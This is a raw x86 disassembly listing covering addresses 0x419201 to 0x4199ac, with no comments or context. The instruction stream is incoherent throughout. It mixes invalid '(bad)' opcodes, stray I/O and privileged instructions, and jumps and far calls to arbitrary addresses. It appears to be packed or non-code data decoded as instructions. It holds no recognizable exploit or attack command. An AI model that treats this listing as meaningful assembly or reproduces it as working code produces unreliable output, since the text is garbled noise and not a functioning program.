  419201:	sub    al,0xc4
  419203:	mov    dh,0x72
  419205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419206:	in     eax,0x37
  419208:	add    eax,0x6505c11d
  41920d:	lahf   
  41920e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41920f:	int3   
  419210:	push   0x73abee2f
  419215:	call   0xd316dfdb
  41921a:	cmp    al,0x94
  41921c:	into   
  41921d:	inc    ebp
  41921e:	or     DWORD PTR [edx+0x18],0x6b1efdb4
  419225:	or     eax,0x497d1728
  41922a:	nop
  41922b:	pop    edx
  41922c:	push   ecx
  41922d:	pop    ecx
  41922e:	or     DWORD PTR [edi-0x41c99768],ebp
  419234:	and    BYTE PTR [ebp+0x58f879a5],cl
  41923a:	cdq    
  41923b:	or     bl,ch
  41923d:	jp     0x4192a7
  41923f:	out    0x5e,eax
  419241:	std    
  419242:	clc    
  419243:	sar    BYTE PTR [eax+0x6a],0xef
  419247:	sbb    bh,bh
  419249:	(bad)  
  41924a:	adc    BYTE PTR [edi-0x7288f3b],dh
  419250:	jbe    0x419230
  419252:	sbb    al,al
  419254:	lea    esi,[edx+0x6b]
  419257:	ins    BYTE PTR es:[edi],dx
  419258:	sub    dh,BYTE PTR [edi+eax*1]
  41925b:	test   DWORD PTR [ebp+0x4a89831d],edi
  419261:	or     dh,bl
  419263:	ret    0xb182
  419266:	pop    DWORD PTR [eax]
  419268:	lea    edx,[eax-0x38]
  41926b:	mov    ah,0x39
  41926d:	mov    bh,0xf6
  41926f:	sub    DWORD PTR [ecx],edi
  419271:	pop    ecx
  419272:	dec    esp
  419273:	xchg   esi,eax
  419274:	pop    edi
  419275:	ins    BYTE PTR es:[edi],dx
  419276:	and    DWORD PTR [eax+edx*8-0x69a8c10e],ebp
  41927d:	retf   0x8b1d
  419280:	sbb    eax,0xaaaed3e2
  419285:	call   FWORD PTR [esp+esi*8]
  419288:	dec    edx
  419289:	ret    0xdcf6
  41928c:	jae    0x41929e
  41928e:	in     eax,0x59
  419290:	mov    ebp,0x359e76a5
  419295:	out    dx,eax
  419296:	aad    0xcf
  419298:	ss out dx,eax
  41929a:	psubd  mm3,mm6
  41929d:	mov    al,ds:0x11a7539e
  4192a2:	jno    0x41927f
  4192a4:	jbe    0x419301
  4192a6:	jae    0x419234
  4192a8:	inc    ecx
  4192a9:	mov    bl,0x35
  4192ab:	inc    esi
  4192ac:	pop    esi
  4192ad:	mov    ah,BYTE PTR [esi+edx*1-0x7a]
  4192b1:	push   ebp
  4192b2:	js     0x4192a9
  4192b4:	ror    DWORD PTR [edx],cl
  4192b6:	fsub   DWORD PTR [eax+0x2a0d9135]
  4192bc:	fidiv  DWORD PTR [edx-0x1c]
  4192bf:	gs cdq 
  4192c1:	sbb    BYTE PTR [eax+0x48a495c],cl
  4192c7:	test   al,0x93
  4192c9:	sti    
  4192ca:	mov    ebx,0xd17f0ea8
  4192cf:	popa   
  4192d0:	aaa    
  4192d1:	xchg   ecx,eax
  4192d2:	dec    esp
  4192d3:	popf   
  4192d4:	mov    esp,0xc4c35ebe
  4192d9:	dec    esi
  4192da:	out    0xba,eax
  4192dc:	xchg   bl,bh
  4192de:	jle    0x419293
  4192e0:	cmp    eax,0x11a96904
  4192e5:	pop    es
  4192e6:	mov    ch,0xcc
  4192e8:	or     ecx,DWORD PTR [ecx]
  4192ea:	adc    eax,eax
  4192ec:	ins    BYTE PTR es:[edi],dx
  4192ed:	push   esi
  4192ee:	ret    
  4192ef:	std    
  4192f0:	cld    
  4192f1:	dec    eax
  4192f2:	adc    edi,DWORD PTR [esi-0x8]
  4192f5:	cmc    
  4192f6:	ss pop ds
  4192f8:	sub    eax,DWORD PTR [edi]
  4192fa:	call   0x5849:0x8a77085d
  419301:	ss es jl 0x41932e
  419305:	jge    0x4192a7
  419307:	ds loopne 0x419304
  41930a:	push   ebp
  41930b:	in     al,dx
  41930c:	fisub  WORD PTR [ebx-0x66788ad9]
  419312:	das    
  419313:	leave  
  419314:	(bad)  
  419315:	arpl   WORD PTR [ebp-0x77],di
  419318:	pop    ss
  419319:	dec    ebp
  41931a:	mov    WORD PTR [edx+esi*1+0x39],?
  41931e:	add    edi,edi
  419320:	shl    DWORD PTR [ecx+0xd],0x8a
  419324:	sub    ebp,DWORD PTR [ebx]
  419326:	in     al,dx
  419327:	mov    ds:0x972ba990,eax
  41932c:	sbb    BYTE PTR [eax],cl
  41932e:	xor    BYTE PTR [ebx],al
  419330:	(bad)  
  419331:	xchg   esi,eax
  419332:	clc    
  419333:	mov    ch,bl
  419335:	test   al,0x2e
  419337:	or     edi,eax
  419339:	mov    ?,WORD PTR [ecx]
  41933b:	sbb    eax,0x6a08c1f2
  419340:	repnz les ebp,FWORD PTR [esp+ebp*1-0x5c39686b]
  419348:	sbb    BYTE PTR [ecx],bh
  41934a:	fbld   TBYTE PTR [ecx-0x4f27ba2a]
  419350:	mov    bl,0x59
  419352:	imul   edx,edx,0xfffffffc
  419355:	imul   BYTE PTR [esi-0x7ada6002]
  41935b:	repnz mov dh,0xd4
  41935e:	leave  
  41935f:	mov    ds:0x357990ce,eax
  419364:	and    esi,DWORD PTR [edi]
  419366:	lods   al,BYTE PTR ds:[esi]
  419367:	cld    
  419368:	(bad)  
  419369:	pop    ebx
  41936a:	xor    eax,0xce226a14
  41936f:	sbb    al,BYTE PTR [edx+ebp*2]
  419372:	gs mov ah,0x83
  419375:	add    cl,dl
  419377:	rcl    dl,0x4b
  41937a:	and    al,0x8b
  41937c:	cmp    dh,BYTE PTR [ebp+ecx*1+0x5a]
  419380:	xor    bl,ch
  419382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419383:	or     BYTE PTR [ebx+ebp*2+0x2dab8086],ah
  41938a:	mov    eax,0x71e5aa88
  41938f:	and    DWORD PTR [edx-0x71],ebp
  419392:	call   0xaec9e2db
  419397:	fsub   QWORD PTR [ecx-0x2cd64b4]
  41939d:	rcl    DWORD PTR [edi+0x79],cl
  4193a0:	jnp    0x4193e4
  4193a2:	je     0x4193e3
  4193a4:	int    0x80
  4193a6:	push   esp
  4193a7:	jne    0x41934f
  4193a9:	scas   eax,DWORD PTR es:[edi]
  4193aa:	shl    DWORD PTR [eax],cl
  4193ac:	lock cmp ch,BYTE PTR [edi]
  4193af:	xor    DWORD PTR [edx+0xb],eax
  4193b2:	mov    ah,BYTE PTR [eax+0x34a97526]
  4193b8:	dec    ebx
  4193b9:	ins    BYTE PTR es:[edi],dx
  4193ba:	mov    al,0x13
  4193bc:	mov    ch,0xb
  4193be:	or     DWORD PTR [ebp-0x41],esi
  4193c1:	dec    edi
  4193c2:	pushf  
  4193c3:	sbb    al,0x50
  4193c5:	mov    eax,0x430a2058
  4193ca:	pop    ss
  4193cb:	xor    al,0x9a
  4193cd:	or     dl,BYTE PTR [edx+0x263c53c3]
  4193d3:	jae    0x419421
  4193d5:	sub    eax,0xb18b3dbd
  4193da:	jle    0x4193b6
  4193dc:	scas   al,BYTE PTR es:[edi]
  4193dd:	inc    ebx
  4193de:	ror    edx,cl
  4193e0:	push   ss
  4193e1:	lods   al,BYTE PTR ds:[esi]
  4193e2:	xor    edx,DWORD PTR [ebx+0x22]
  4193e5:	test   eax,0xa20bd136
  4193ea:	jb     0x419449
  4193ec:	das    
  4193ed:	jnp    0x4193fe
  4193ef:	pop    ebp
  4193f0:	pop    ebp
  4193f1:	mov    ebx,0x69654624
  4193f6:	push   ebx
  4193f7:	jbe    0x419459
  4193f9:	dec    ebp
  4193fa:	xchg   esp,eax
  4193fb:	xchg   ecx,eax
  4193fc:	out    dx,eax
  4193fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193fe:	jmp    0x4193ae
  419400:	jp     0x4193e4
  419402:	js     0x419452
  419404:	(bad)  
  419406:	test   BYTE PTR [ebx+eax*8-0x2bfd603c],0x5c
  41940e:	xor    bl,ah
  419410:	cmc    
  419411:	add    BYTE PTR [ebp+0x77283707],0xac
  419418:	xchg   ecx,eax
  419419:	jp     0x419496
  41941b:	stc    
  41941c:	mov    bh,0xd4
  41941e:	mov    BYTE PTR [ebx-0x7198d95c],bh
  419424:	jmp    0xd4e9ff7d
  419429:	jl     0x41941f
  41942b:	test   edi,0x696214b2
  419431:	(bad)  
  419433:	sbb    esp,ebp
  419435:	inc    ecx
  419436:	(bad)  
  419437:	adc    ecx,esp
  419439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41943a:	xchg   ecx,eax
  41943b:	mov    ds:0xf007c3ef,al
  419440:	mov    al,0xc
  419442:	mov    cl,0xbc
  419444:	lahf   
  419445:	sbb    bl,BYTE PTR [edx-0x18fa70d7]
  41944b:	adc    dl,BYTE PTR [ecx]
  41944d:	mov    DWORD PTR [esi+ebp*1],0x7257842c
  419454:	cli    
  419455:	sahf   
  419456:	out    dx,eax
  419457:	sbb    dl,ah
  419459:	sub    edx,DWORD PTR [edi-0x6518147d]
  41945f:	jb     0x41946f
  419461:	les    ebp,FWORD PTR [ebx+0x19]
  419464:	dec    esp
  419465:	jl     0x419440
  419467:	call   DWORD PTR [esi-0x80]
  41946a:	jbe    0x419482
  41946c:	ret    
  41946d:	aaa    
  41946e:	fcmovnbe st,st(5)
  419470:	fdivrp st(3),st
  419472:	jp     0x419492
  419474:	and    DWORD PTR [edx-0x49],edx
  419477:	scas   al,BYTE PTR es:[edi]
  419478:	out    0xa4,al
  41947a:	pop    DWORD PTR [ebp-0x29]
  41947d:	dec    eax
  41947e:	lock xchg ebx,eax
  419480:	aas    
  419481:	mov    es,WORD PTR [esi-0x3a]
  419484:	sbb    BYTE PTR [edx],0xa1
  419487:	xor    DWORD PTR [ebx+0x76],eax
  41948a:	push   ebp
  41948b:	mov    edx,0x1cb47883
  419490:	cmp    al,0xd2
  419492:	aas    
  419493:	imul   esp,DWORD PTR [ebp+0x4e],0xffffffa1
  419497:	add    BYTE PTR [edx-0x5d78abd6],dl
  41949d:	adc    al,BYTE PTR [eax+0x27]
  4194a0:	lds    edi,FWORD PTR [ebx]
  4194a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a3:	jb     0x419455
  4194a5:	dec    esp
  4194a6:	aaa    
  4194a7:	xor    al,BYTE PTR [eax]
  4194a9:	es push es
  4194ab:	cmp    al,0xe3
  4194ad:	pop    ebp
  4194ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194af:	push   cs
  4194b0:	nop
  4194b1:	xor    cl,bl
  4194b3:	xor    edx,DWORD PTR [ebx+ebp*1]
  4194b6:	lds    ebp,FWORD PTR [edi]
  4194b8:	pop    eax
  4194b9:	cli    
  4194ba:	cmp    eax,0x41e07a70
  4194bf:	addr16 (bad) 
  4194c2:	mov    edx,0x66c33111
  4194c7:	xchg   esi,eax
  4194c8:	test   eax,0x58321c0f
  4194cd:	adc    DWORD PTR ds:0xe5ac8601,0x19
  4194d4:	mov    esp,0x1faf933e
  4194da:	mov    bl,0x5c
  4194dc:	imul   ebp,DWORD PTR [ebp+0x31f57b10],0xfffffff2
  4194e3:	or     ebp,DWORD PTR [edi]
  4194e5:	cmp    DWORD PTR [eiz*1+0x62e61f4c],esp
  4194ec:	push   0x5110e103
  4194f1:	ss mov ah,0xe
  4194f4:	fnsave [eax+0x21e28ece]
  4194fa:	iret   
  4194fb:	inc    esp
  4194fc:	pushf  
  4194fd:	and    eax,0xd2272800
  419502:	addr16 push es
  419504:	js     0x419528
  419506:	inc    ebx
  419507:	(bad)  
  419509:	icebp  
  41950a:	aas    
  41950b:	ret    0x5b54
  41950e:	mov    ds,ebx
  419510:	test   al,0x60
  419512:	cmc    
  419513:	xchg   ebx,eax
  419514:	es ins BYTE PTR es:[edi],dx
  419516:	mov    WORD PTR [ebx-0x48d7e781],cs
  41951c:	inc    ecx
  41951d:	jae    0x4194bb
  41951f:	scas   al,BYTE PTR es:[edi]
  419520:	or     esi,DWORD PTR [eax-0xa3c1eb6]
  419526:	sbb    edx,DWORD PTR [esi-0x65ec3733]
  41952c:	stc    
  41952d:	lea    edx,ds:0xd65265e0
  419533:	paddusb mm0,mm2
  419536:	rcr    BYTE PTR [ebx-0x62ab4823],0x91
  41953d:	out    0xe8,eax
  41953f:	lock int 0x30
  419542:	mov    bl,0xe2
  419544:	pop    ecx
  419545:	mov    DWORD PTR [ecx+0x21bdf91e],edx
  41954b:	pop    edi
  41954c:	popf   
  41954d:	sbb    ebx,DWORD PTR [ecx+0xb]
  419550:	add    ah,BYTE PTR [edx+0x6b]
  419553:	adc    esp,edi
  419555:	int3   
  419556:	imul   esp,DWORD PTR [eax-0x684efa32],0x46
  41955d:	mov    edi,0xf02cfd93
  419562:	out    0x37,eax
  419564:	inc    edi
  419565:	cmp    ecx,DWORD PTR [ecx]
  419567:	and    dh,dl
  419569:	mov    ebx,DWORD PTR [edi+0x19832099]
  41956f:	sbb    ecx,eax
  419571:	enter  0x5623,0xfb
  419575:	or     ebx,ecx
  419577:	ret    
  419578:	ret    0xd849
  41957b:	fcmovnb st,st(0)
  41957d:	push   0xf
  41957f:	mov    ah,0xc8
  419581:	(bad)  
  419582:	dec    edi
  419583:	(bad)  
  419585:	adc    eax,0x1615d456
  41958a:	or     bh,bl
  41958c:	jns    0x41958c
  41958e:	inc    esp
  41958f:	mov    WORD PTR [ecx-0x56],ss
  419592:	xor    al,BYTE PTR fs:[eax]
  419595:	pop    edi
  419596:	mov    ecx,0x1bcdbed6
  41959b:	xchg   DWORD PTR [edx-0x6059f4e6],esp
  4195a1:	int3   
  4195a2:	xchg   esp,eax
  4195a3:	inc    ecx
  4195a4:	popa   
  4195a5:	xor    BYTE PTR [ecx+0x4a700cb6],0xe4
  4195ac:	(bad)  
  4195ad:	lds    ebx,FWORD PTR [esi-0x2fea53df]
  4195b3:	push   esi
  4195b4:	lds    edx,FWORD PTR [edx+0x6d73e16d]
  4195ba:	iret   
  4195bb:	push   0xe422c4a9
  4195c0:	mov    esp,0x5555df26
  4195c5:	lds    esi,FWORD PTR [ebp-0x478589ca]
  4195cb:	mov    bh,0xf0
  4195cd:	xor    esp,0x6e
  4195d0:	mov    edx,0xd02a232c
  4195d5:	push   ds
  4195d6:	ds xor eax,0xc4b4256a
  4195dc:	popf   
  4195dd:	push   ebp
  4195de:	loop   0x419598
  4195e0:	cmp    BYTE PTR [ebx],0x18
  4195e3:	xor    cl,BYTE PTR [ebx]
  4195e5:	xchg   edi,eax
  4195e6:	mov    dh,0xd5
  4195e8:	jge    0x41958e
  4195ea:	aad    0x36
  4195ec:	pusha  
  4195ed:	fimul  DWORD PTR [ebp-0x3b8a460b]
  4195f3:	sub    al,0x97
  4195f5:	in     eax,dx
  4195f6:	mov    eax,ds:0x9974b976
  4195fb:	mov    al,0x68
  4195fd:	scas   al,BYTE PTR es:[edi]
  4195fe:	hlt    
  4195ff:	inc    ebp
  419600:	clc    
  419601:	mov    BYTE PTR [ebx+0x2b],ch
  419604:	mov    bh,0x8f
  419606:	pop    edx
  419607:	imul   ebx,DWORD PTR [ecx-0x13],0xfae65d55
  41960e:	mov    ebx,0x21a93ff6
  419613:	popa   
  419614:	fwait
  419615:	mov    al,ds:0x82743ba0
  41961a:	fild   DWORD PTR [esi]
  41961c:	repnz in eax,0x74
  41961f:	pop    eax
  419620:	out    dx,eax
  419621:	push   edi
  419622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419623:	les    esp,FWORD PTR [eax]
  419625:	sub    edi,DWORD PTR [ebx]
  419627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419628:	aad    0xbe
  41962a:	push   0xffffffe8
  41962c:	pop    esi
  41962d:	in     al,0x65
  41962f:	loop   0x41968c
  419631:	jg     0x41961e
  419633:	sbb    cl,BYTE PTR [eax-0x4b]
  419636:	mov    eax,0xed515a3e
  41963b:	nop
  41963c:	jne    0x419658
  41963e:	fnstenv [esi+0x257addfa]
  419644:	push   0xffffffdf
  419646:	fwait
  419647:	cs sahf 
  419649:	pop    ecx
  41964a:	dec    eax
  41964b:	inc    ebp
  41964c:	and    eax,0x2d8520c8
  419651:	dec    edi
  419652:	dec    edx
  419653:	lds    edi,FWORD PTR [edi+0x3d]
  419656:	lds    ebp,FWORD PTR ds:0x5f188ce3
  41965c:	loopne 0x41964a
  41965e:	push   0x6b
  419660:	pop    DWORD PTR [ebx+0x4e]
  419663:	ins    BYTE PTR es:[edi],dx
  419664:	push   0xffffff9e
  419666:	pop    ss
  419667:	mov    ecx,0x475e447c
  41966c:	mov    esi,fs
  41966e:	fcomp  DWORD PTR [edx+0x63]
  419671:	pop    es
  419672:	leave  
  419673:	dec    eax
  419674:	mov    WORD PTR [esi-0x1dd46268],ss
  41967a:	(bad)  
  41967b:	sti    
  41967c:	lahf   
  41967d:	sbb    DWORD PTR [eax-0x3],ebp
  419680:	aad    0x14
  419682:	inc    ecx
  419683:	inc    edi
  419684:	adc    DWORD PTR [eax+0x6e1cbe03],ebx
  41968a:	xchg   ecx,eax
  41968b:	pop    ecx
  41968c:	pusha  
  41968d:	xor    BYTE PTR [ebp+0x116bab86],0x7
  419694:	mov    al,0x1b
  419696:	push   DWORD PTR [ecx]
  419698:	dec    edx
  419699:	push   es
  41969a:	clc    
  41969b:	sbb    BYTE PTR [edi-0x38],ch
  41969e:	or     DWORD PTR [esi],esp
  4196a0:	push   esi
  4196a1:	jge    0x419704
  4196a3:	jle    0x419632
  4196a5:	cdq    
  4196a6:	xor    dh,BYTE PTR [edi-0x17db60d6]
  4196ac:	sub    dh,BYTE PTR [eax+0x55]
  4196af:	shl    DWORD PTR [eax+0x7b6b08cd],1
  4196b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b6:	stc    
  4196b7:	repz dec edx
  4196b9:	out    0xab,al
  4196bb:	xor    bh,BYTE PTR [edx]
  4196bd:	sub    ecx,DWORD PTR [ebp-0xd]
  4196c0:	lods   eax,DWORD PTR ds:[esi]
  4196c1:	or     DWORD PTR [esi-0x6c],esi
  4196c4:	xchg   edx,eax
  4196c5:	fldenv [edi+0x23]
  4196c8:	shl    BYTE PTR [edx+0x20],1
  4196cb:	cmc    
  4196cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196cd:	mov    BYTE PTR [edx+0x2af28895],cl
  4196d3:	and    eax,0x79712f4d
  4196d8:	scas   al,BYTE PTR es:[edi]
  4196d9:	(bad)  
  4196da:	loope  0x41966e
  4196dc:	in     eax,0xce
  4196de:	icebp  
  4196df:	cmp    ebx,DWORD PTR [ecx+0x8]
  4196e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196e3:	dec    eax
  4196e4:	and    eax,0x1c6d6919
  4196e9:	jg     0x41975f
  4196eb:	mov    dh,0xbe
  4196ed:	pop    ss
  4196ee:	jb     0x419729
  4196f0:	mul    bl
  4196f2:	jp     0x4196ae
  4196f4:	adc    al,0x9
  4196f6:	xchg   ecx,eax
  4196f7:	(bad)  
  4196f8:	cmp    DWORD PTR [esp+edx*4+0x32],eax
  4196fc:	test   eax,0x50375f15
  419701:	jg     0x419719
  419703:	ds push cs
  419705:	mov    edx,0xa6e54993
  41970a:	aam    0x85
  41970c:	mov    cl,0xcf
  41970e:	jno    0x4196b7
  419710:	sub    BYTE PTR [edi],ch
  419712:	xchg   edi,eax
  419713:	xor    al,0xf3
  419715:	inc    ebx
  419716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419717:	add    al,0x3e
  419719:	mov    bh,0xa3
  41971b:	xchg   esp,eax
  41971c:	xchg   esi,eax
  41971d:	fistp  WORD PTR [eax]
  41971f:	xchg   DWORD PTR [esi+0x42a2874],ebx
  419725:	ins    BYTE PTR es:[edi],dx
  419726:	lods   eax,DWORD PTR ds:[esi]
  419727:	stc    
  419728:	jle    0x41970d
  41972a:	add    BYTE PTR ds:0xea73d8dc,bh
  419730:	gs ja  0x41970b
  419733:	cmp    BYTE PTR [ecx],0xcc
  419736:	mov    ebp,esp
  419738:	cmp    bh,dl
  41973a:	out    0x7,al
  41973c:	inc    ebx
  41973d:	xchg   esp,eax
  41973e:	inc    esp
  41973f:	dec    ebx
  419740:	es cli 
  419742:	sbb    cl,ch
  419744:	lods   eax,DWORD PTR ds:[esi]
  419745:	adc    BYTE PTR [eax-0x422c9f97],dh
  41974b:	pop    esi
  41974c:	icebp  
  41974d:	xchg   esp,eax
  41974e:	aas    
  41974f:	xchg   edi,eax
  419750:	xchg   ebx,eax
  419751:	clc    
  419752:	mov    ah,0x13
  419754:	js     0x4196dd
  419756:	pop    esi
  419757:	retf   
  419758:	popa   
  419759:	sub    BYTE PTR [edx-0x5f18c6cb],bl
  41975f:	mov    esp,0xea2b48a8
  419764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419766:	mov    ds,WORD PTR gs:[eax]
  419769:	jb     0x419751
  41976b:	sub    BYTE PTR [ebx],cl
  41976d:	outs   dx,BYTE PTR ds:[esi]
  41976e:	addr16 pusha 
  419770:	scas   eax,DWORD PTR es:[edi]
  419771:	shl    edx,0xb2
  419774:	rcr    BYTE PTR [esi+0x71],cl
  419777:	cmp    esp,DWORD PTR [esi]
  419779:	xchg   esi,eax
  41977a:	leave  
  41977b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977c:	adc    cl,dh
  41977e:	call   FWORD PTR [esp+eax*1-0x6c0fb357]
  419785:	out    0xbe,eax
  419787:	paddsb mm4,QWORD PTR [edx]
  41978a:	in     al,dx
  41978b:	sub    eax,ebp
  41978d:	icebp  
  41978e:	add    bh,BYTE PTR ds:0x18907617
  419794:	repnz clc 
  419796:	mov    dl,BYTE PTR [esi]
  419798:	fistp  QWORD PTR ds:0xf48e3e2d
  41979e:	or     BYTE PTR [edx+0x310befb1],0x37
  4197a5:	mov    dh,0xe3
  4197a7:	arpl   WORD PTR [ebp-0x9],sp
  4197aa:	pop    eax
  4197ab:	dec    ebp
  4197ac:	jnp    0x419825
  4197ae:	call   0x6be4afb2
  4197b3:	scas   eax,DWORD PTR es:[edi]
  4197b4:	iret   
  4197b5:	cmp    eax,0x91ea9690
  4197ba:	sub    BYTE PTR [edi+0x54],ch
  4197bd:	inc    edi
  4197be:	jno    0x4197f6
  4197c0:	pop    es
  4197c1:	iret   
  4197c2:	xchg   edx,eax
  4197c3:	cmp    al,0xb0
  4197c5:	add    esi,edi
  4197c7:	dec    ebx
  4197c8:	xlat   BYTE PTR ds:[ebx]
  4197c9:	cwde   
  4197ca:	popf   
  4197cb:	adc    BYTE PTR [esi+edi*8],dh
  4197ce:	fwait
  4197cf:	imul   ebx,DWORD PTR [edx-0x13e36c60],0x10
  4197d6:	jo     0x4197f4
  4197d8:	pop    ds
  4197d9:	hlt    
  4197da:	jnp    0x41981a
  4197dc:	or     BYTE PTR [edi-0x35fe820b],0x21
  4197e3:	sub    BYTE PTR [edx*4+0xfa9020b],bl
  4197ea:	(bad)  
  4197eb:	ficom  WORD PTR [ebx]
  4197ed:	jbe    0x419824
  4197ef:	add    dl,0x9d
  4197f2:	leave  
  4197f3:	lds    esp,FWORD PTR [esi-0x78]
  4197f6:	jl     0x419835
  4197f8:	jno    0x419850
  4197fa:	out    0xf1,eax
  4197fc:	jne    0x4197e3
  4197fe:	cmovg  esi,esi
  419801:	mov    ebx,0x31ecaa53
  419806:	sub    BYTE PTR [edi],bl
  419808:	fisttp QWORD PTR [edi-0xd83e6e3]
  41980e:	dec    ebx
  41980f:	xor    al,BYTE PTR [eax]
  419811:	sub    esp,0x5aa2f5f2
  419817:	popf   
  419818:	loope  0x419868
  41981a:	jmp    0x8ed7bf65
  41981f:	inc    eax
  419820:	cld    
  419821:	or     eax,0xbf91f889
  419826:	push   ebp
  419827:	adc    BYTE PTR [esp],dl
  41982a:	jb     0x41982d
  41982c:	add    ch,BYTE PTR [bx+si]
  41982f:	inc    edx
  419830:	out    0xc5,eax
  419832:	mov    ds:0xc81ec65d,al
  419837:	add    esp,edx
  419839:	push   ecx
  41983a:	push   0xffffffc8
  41983c:	mov    ecx,0x4392fa01
  419841:	xchg   ecx,eax
  419842:	sub    DWORD PTR ds:0xe900a9cb,0x55c4a217
  41984c:	inc    ebp
  41984d:	clc    
  41984e:	fst    QWORD PTR [edi+0x487f44a3]
  419854:	stos   BYTE PTR es:[edi],al
  419855:	dec    ebx
  419856:	popf   
  419857:	ret    0x6e0d
  41985a:	jp     0x4198c7
  41985c:	sbb    BYTE PTR [esi],dh
  41985e:	inc    ebp
  41985f:	test   BYTE PTR [ecx+0x6f],0xf7
  419863:	xchg   DWORD PTR [esi],eax
  419865:	xlat   BYTE PTR ds:[ebx]
  419866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419867:	bound  edx,QWORD PTR [eax]
  419869:	in     eax,dx
  41986a:	and    ah,BYTE PTR [edx+0x582543b1]
  419870:	xor    edx,esp
  419872:	out    0x72,eax
  419874:	data16 das 
  419876:	push   cs
  419877:	lds    ebp,FWORD PTR [edi+eax*1]
  41987a:	into   
  41987b:	push   edi
  41987c:	sbb    al,0xcb
  41987e:	pusha  
  41987f:	mov    ebp,0xe5117fa4
  419884:	mov    bl,bl
  419886:	sahf   
  419887:	sbb    eax,0x48f934a1
  41988c:	xlat   BYTE PTR ds:[ebx]
  41988d:	retf   0x84c0
  419890:	sbb    esi,DWORD PTR [eax+0x1de81c21]
  419896:	shr    DWORD PTR [ebp-0x29],0x87
  41989a:	inc    esp
  41989b:	sub    dl,dh
  41989d:	aad    0x56
  41989f:	cmp    eax,0x549a3f34
  4198a4:	retf   
  4198a5:	repz fldl2t 
  4198a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a9:	or     eax,0x2a6557cc
  4198ae:	mov    BYTE PTR [edi],ah
  4198b0:	lahf   
  4198b1:	mov    ah,0xa3
  4198b3:	inc    ebp
  4198b4:	mov    esi,0xbdf7af8
  4198b9:	jg     0x4198c9
  4198bb:	xchg   DWORD PTR [ebx-0x7a],esp
  4198be:	retf   0x1164
  4198c1:	and    BYTE PTR [eax-0xe],0x5d
  4198c5:	dec    eax
  4198c6:	arpl   WORD PTR [esp+edx*4],dx
  4198c9:	pop    edi
  4198ca:	rol    BYTE PTR [edi],0x2a
  4198cd:	adc    edi,DWORD PTR [esi]
  4198cf:	xlat   BYTE PTR ds:[ebx]
  4198d0:	adc    bh,BYTE PTR [edi]
  4198d2:	dec    esi
  4198d3:	loopne 0x419870
  4198d5:	aam    0x4f
  4198d7:	shl    DWORD PTR [ebx],1
  4198d9:	popa   
  4198da:	push   edi
  4198db:	imul   eax,esi,0x3e
  4198de:	add    bh,cl
  4198e0:	and    DWORD PTR [edx+0xf],edx
  4198e3:	mov    ebp,0x1c713e1
  4198e8:	cdq    
  4198e9:	dec    esi
  4198ea:	aad    0x1
  4198ec:	test   al,0x9a
  4198ee:	cmp    DWORD PTR ds:0x84196899,0x6d
  4198f5:	(bad)  
  4198f6:	fnstcw WORD PTR [edi-0x5beb0441]
  4198fc:	add    bl,BYTE PTR [esi+0x451a56c2]
  419902:	int3   
  419903:	hlt    
  419904:	fidivr DWORD PTR [ebx+0x4f]
  419907:	ds pusha 
  419909:	jae    0x419970
  41990b:	cmc    
  41990c:	dec    edi
  41990d:	sbb    DWORD PTR [eax-0x74d8eead],ecx
  419913:	cmp    edx,DWORD PTR [esi+0x1a]
  419916:	out    dx,eax
  419917:	test   al,0x9d
  419919:	lds    ebx,FWORD PTR [ebx]
  41991b:	cdq    
  41991c:	imul   ebp,DWORD PTR [edi+0x4ea64b0c],0x92e1e6f5
  419926:	or     dl,BYTE PTR [ecx+0x304ffcdb]
  41992c:	mov    dh,0xe
  41992e:	fs rcl BYTE PTR ss:[esi+0x38],1
  419933:	in     eax,dx
  419934:	ficomp WORD PTR [edx-0x18ae0fd2]
  41993a:	push   ebx
  41993b:	push   ds
  41993c:	ret    
  41993d:	(bad)  
  41993f:	fstp   st(5)
  419941:	mov    ebx,0x4abe3e0e
  419946:	xor    BYTE PTR [ebp+ebx*1-0x67],ch
  41994a:	mov    eax,0x86021b5d
  41994f:	call   0x2437e0b9
  419954:	neg    edi
  419956:	pop    ss
  419957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419958:	pop    esp
  419959:	add    DWORD PTR [ecx+0x5c],edx
  41995c:	gs push cs
  41995e:	test   al,0xef
  419960:	mov    bh,0x47
  419962:	int3   
  419963:	pop    esp
  419964:	mov    DWORD PTR [ebp+0x53],ebp
  419967:	or     esp,DWORD PTR [esi]
  419969:	leave  
  41996a:	mov    al,0xff
  41996c:	call   0x4ee6b9f
  419971:	in     eax,0xdb
  419973:	adc    dl,BYTE PTR [edx+esi*2]
  419976:	pop    edx
  419977:	xlat   BYTE PTR ds:[ebx]
  419978:	fstp   TBYTE PTR [eax+edi*8]
  41997b:	push   0x2b1d0ee
  419980:	fadd   DWORD PTR [edx-0x6ca7a2e5]
  419986:	ror    BYTE PTR [ebx],1
  419988:	mov    ebp,0xb42da60e
  41998d:	fs retf 0xe1bc
  419991:	add    BYTE PTR ds:0xf7f73c3,bh
  419997:	jne    0x4199cf
  419999:	retf   
  41999a:	into   
  41999b:	and    BYTE PTR [esi+edi*8-0x6f],ch
  41999f:	fiadd  WORD PTR [ebx]
  4199a1:	xchg   esi,eax
  4199a2:	fwait
  4199a3:	mov    cl,0x9e
  4199a5:	dec    esi
  4199a6:	inc    edi
  4199a7:	outs   dx,DWORD PTR ds:[esi]
  4199a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199a9:	rol    DWORD PTR [esi],0x87
  4199ac:	daa    
